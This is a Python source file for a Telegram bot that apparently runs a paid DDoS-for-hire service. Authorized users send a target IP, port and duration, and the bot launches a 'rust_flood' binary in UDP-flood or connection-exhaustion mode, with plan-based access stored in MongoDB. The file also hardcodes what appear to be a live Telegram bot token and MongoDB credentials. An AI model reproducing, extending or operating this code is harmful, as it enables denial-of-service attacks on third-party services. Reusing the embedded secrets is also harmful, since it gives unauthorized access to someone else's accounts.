import telebot
from telebot import types
import logging
import os
import subprocess
from threading import Thread
from pymongo import MongoClient
import certifi

# ---------- Configuration ----------
ADMIN_ID = 951552160
TOKEN = '7319891408:AAGgZIs6QPVBa_CaSkIl4hZZOiav-7jzV6Q'
MONGO_URI = 'mongodb+srv://spize_db_user:SpizeBBQ@spizebbq.e7r0kwj.mongodb.net'
FORWARD_CHANNEL_ID = -1002185836283
CHANNEL_ID = -1002185836283

# Path to the Rust binary (same folder as this script)
RUST_BINARY = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'rust_flood')

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# MongoDB
client_db = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client_db['sohail']
users_collection = db.users

# Telegram bot (threaded = True allows many users)
bot = telebot.TeleBot(TOKEN, threaded=True)

# ---------- Global attack state ----------
target_ip, target_port, duration = '', 0, 0
connections = 5000                   # default for connection mode
current_process = None
forced_stopped = False

# ---------- Attack execution ----------
def kill_rust_flood():
    global current_process
    if current_process and current_process.returncode is None:
        logging.info("Killing rust_flood...")
        current_process.terminate()
        try:
            current_process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            current_process.kill()
        current_process = None

def run_attack_blocking(ip, port, dur, mode, chat_id, username, conns=5000):
    global current_process, forced_stopped
    if mode == 'flood':
        # Volumetric UDP flood (original)
        cmd = [
            RUST_BINARY,
            '--target', f'{ip}:{port}',
            '--duration', str(dur),
            '--tasks', '1000',
            '--size', '1472',
            '--mode', 'flood'
        ]
    elif mode == 'connection':
        # Low‑bandwidth connection exhaustion
        cmd = [
            RUST_BINARY,
            '--target', f'{ip}:{port}',
            '--duration', str(dur),
            '--connections', str(conns),
            '--keepalive', '8',
            '--mode', 'connection'
        ]
    else:
        logging.error(f"Unknown mode: {mode}")
        return

    logging.info(f"Attack ({mode}): {' '.join(cmd)}")
    try:
        current_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            preexec_fn=os.setsid
        )
        stdout, stderr = current_process.communicate()
        return_code = current_process.returncode
        current_process = None

        if stdout:
            logging.info(f"Output:\n{stdout}")
        if stderr:
            logging.error(f"Stderr:\n{stderr}")

        if forced_stopped:
            msg = f"🎯 {mode.title()} attack stopped manually.\nIP: {ip}:{port}"
        else:
            msg = f"✅ {mode.title()} attack finished.\nIP: {ip}:{port}\nDuration: {dur}s"
            if mode == 'connection':
                msg += f"\nSimulated clients: {conns}"

        bot.send_message(chat_id, msg, reply_markup=markup2)
        if chat_id != ADMIN_ID:
            bot.send_message(ADMIN_ID, f"Attack ended\nIP: {ip}\nPort: {port}\nUser: {username}")
    except Exception as e:
        logging.error(f"Attack error: {e}")
        bot.send_message(chat_id, f"❌ Attack error: {e}", parse_mode='Markdown')
        if chat_id != ADMIN_ID:
            bot.send_message(ADMIN_ID, f"Attack error for {ip}:{port}: {e}")
    finally:
        current_process = None
        forced_stopped = False

# ---------- Bot commands ----------
@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.reply_to(message, f"Your ID: {message.chat.id}")

markup1 = types.InlineKeyboardMarkup(row_width=1)
stop_button = types.InlineKeyboardButton('🛑 Stop Attack', callback_data='stop')
markup1.add(stop_button)

markup2 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
start_vol = telebot.types.KeyboardButton("🔥 Start Flood Attack")
start_conn = telebot.types.KeyboardButton("🕸️ Start Connection Attack")
markup2.add(start_vol, start_conn)

@bot.message_handler(commands=['adduser'])
def add_user_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorised.")
        return
    try:
        _, uid, plan = message.text.split()
        uid, plan = int(uid), int(plan)
        if plan < 1:
            bot.reply_to(message, "Plan must be ≥ 1.")
            return
        users_collection.update_one({"user_id": uid}, {"$set": {"plan": plan}}, upsert=True)
        bot.reply_to(message, f"✅ User {uid} set to plan {plan}.")
    except:
        bot.reply_to(message, "Usage: /adduser <id> <plan>")

# ---------- Volumetric flood (/save) ----------
@bot.message_handler(commands=['save'])
def save_flood(message):
    user = users_collection.find_one({"user_id": message.from_user.id})
    if not user or user.get('plan', 0) == 0:
        return bot.send_message(message.chat.id, "*Access Denied!*\nContact: @sohail2311", parse_mode='Markdown')
    name = message.from_user.first_name or message.from_user.username
    bot.send_message(
        message.chat.id,
        f"*Volumetric Flood*\n{name}, send:\n`IP PORT DURATION`\nExample: `12.34.56.78 17313 60`",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_flood)

def process_flood(message):
    global target_ip, target_port, duration
    try:
        ip, port, dur = message.text.split()
        port, dur = int(port), int(dur)
        if port in blocked_ports:
            return bot.send_message(message.chat.id, f"Port {port} blocked.")
        target_ip, target_port, duration = ip, port, dur
        bot.send_message(message.chat.id, "Attack ready!\nPress **🔥 Start Flood Attack**", reply_markup=markup2)
    except:
        bot.send_message(message.chat.id, "Invalid format. Use: `IP PORT DURATION`")

# ---------- Connection exhaustion (/connection) ----------
@bot.message_handler(commands=['connection'])
def save_connection(message):
    user = users_collection.find_one({"user_id": message.from_user.id})
    if not user or user.get('plan', 0) == 0:
        return bot.send_message(message.chat.id, "*Access Denied!*", parse_mode='Markdown')
    name = message.from_user.first_name or message.from_user.username
    bot.send_message(
        message.chat.id,
        f"*Connection Exhaustion*\n{name}, send:\n`IP PORT DURATION CONNECTIONS`\nExample: `12.34.56.78 17313 120 8000`",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_connection)

def process_connection(message):
    global target_ip, target_port, duration, connections
    try:
        parts = message.text.split()
        if len(parts) != 4:
            return bot.send_message(message.chat.id, "Need exactly 4 values: IP PORT DURATION CONNECTIONS")
        ip, port, dur, conns = parts[0], int(parts[1]), int(parts[2]), int(parts[3])
        if port in blocked_ports:
            return bot.send_message(message.chat.id, f"Port {port} blocked.")
        target_ip, target_port, duration = ip, port, dur
        connections = conns
        bot.send_message(
            message.chat.id,
            f"Connection attack ready!\n"
            f"IP: `{ip}`\nPort: `{port}`\nDuration: `{dur}s`\nFake clients: `{conns}`\n\n"
            f"Press **🕸️ Start Connection Attack**",
            reply_markup=markup2,
            parse_mode='Markdown'
        )
    except:
        bot.send_message(message.chat.id, "Invalid format. Use: `IP PORT DURATION CONNECTIONS`")

# ---------- Start attack buttons ----------
@bot.message_handler(func=lambda m: m.text == '🔥 Start Flood Attack')
def start_flood_attack(message):
    global target_ip, target_port, duration
    if not target_ip:
        return bot.send_message(message.chat.id, "Use /save first.")
    if current_process and current_process.returncode is None:
        return bot.send_message(message.chat.id, "An attack is already running.")
    forced_stopped = False
    bot.send_message(message.chat.id, "⚡ Volumetric UDP flood started.", reply_markup=markup1)
    Thread(target=run_attack_blocking, args=(target_ip, target_port, duration, 'flood', message.chat.id, message.from_user.username), daemon=True).start()

@bot.message_handler(func=lambda m: m.text == '🕸️ Start Connection Attack')
def start_connection_attack(message):
    global target_ip, target_port, duration, connections
    if not target_ip:
        return bot.send_message(message.chat.id, "Use /connection first.")
    if current_process and current_process.returncode is None:
        return bot.send_message(message.chat.id, "An attack is already running.")
    forced_stopped = False
    bot.send_message(message.chat.id, f"🕸️ Connection exhaustion started ({connections} clients).", reply_markup=markup1)
    Thread(target=run_attack_blocking, args=(target_ip, target_port, duration, 'connection', message.chat.id, message.from_user.username, connections), daemon=True).start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_attack_callback(call):
    global forced_stopped
    if not current_process or current_process.returncode is not None:
        return bot.send_message(call.message.chat.id, "No active attack.")
    forced_stopped = True
    kill_rust_flood()
    bot.send_message(call.message.chat.id, "Attack stopped.", reply_markup=markup2)

# ---------- Main loop ----------
if __name__ == "__main__":
    if not os.path.isfile(RUST_BINARY):
        logging.error(f"rust_flood not found at {RUST_BINARY}.")
        exit(1)
    os.chmod(RUST_BINARY, 0o755)
    logging.info("🤖 Bot with volumetric & connection attacks started.")
    bot.infinity_polling()